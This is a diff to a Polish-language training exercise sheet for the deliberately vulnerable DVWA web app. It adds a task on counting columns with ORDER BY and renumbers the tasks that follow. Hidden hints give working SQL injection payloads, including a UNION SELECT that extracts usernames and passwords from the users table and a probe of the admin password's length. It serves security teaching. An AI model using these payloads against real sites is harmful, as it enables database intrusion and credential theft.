@@ -5,6 +5,7 @@
 
 docker run -d -p 80:80 vulnerables/web-dvwa
 Zaloguj się, admin/password
+Create/reset database
 
 # Zadanie 1
 
@@ -32,6 +33,17 @@ Podpowiedź
 
 # Zadanie 2
 
+Za pomocą ORDER BY sprawdzić ilość kolumn w tabeli
+
+## **Co powinno się stać**
+Po przekroczeniu ilości tabeli zwrócony zostanie błąd
+
+Podpowiedź
+<details>
+1' ORDER BY 2-- -
+</details>
+# Zadanie 3
+
 Użyć UNION SELECT, aby pobrać dane z innej tabeli (users).
 
 
@@ -43,7 +55,7 @@ Podpowiedź
 1' UNION SELECT user, password FROM users -- -
 </details>
 
-# Zadanie 3
+# Zadanie 4
 
 Wykryć z jakiego systemu baz danych korzysta strona za pomocą error-based SQL Injection
 
@@ -56,7 +68,7 @@ Podpowiedź
 '
 </details>
 
-# Zadanie 4
+# Zadanie 5
 
 Sprawdzić długość hasła admina
 
@@ -69,7 +81,7 @@ Podpowiedź
 1' AND LENGTH(password)=32 -- -
 </details>
 
-# Zadanie 5
+# Zadanie 6
 
 Ominąć sanityzację wejścia 
 
